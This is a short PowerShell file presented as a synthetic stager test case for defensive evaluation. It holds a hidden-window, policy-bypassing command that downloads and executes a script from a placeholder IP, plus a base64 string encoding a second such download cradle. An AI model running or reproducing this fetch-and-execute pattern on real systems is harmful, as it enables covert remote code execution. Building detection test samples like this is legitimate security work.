# Synthetic Security Test Case: Stager Pattern
# FOR SECURITY EVALUATION AND DEFENSIVE TESTING ONLY
$u = "http://198.51.100.44/stage2_payload.bin"
$encoded = "SW52b2tlLUV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly8xOTguNTEuMTAwLjQ0L3NjcmlwdC5wczEiKQ=="

powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command {
    $client = New-Object System.Net.WebClient
    $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tl"))
    IEX (New-Object Net.WebClient).DownloadString($u)
}
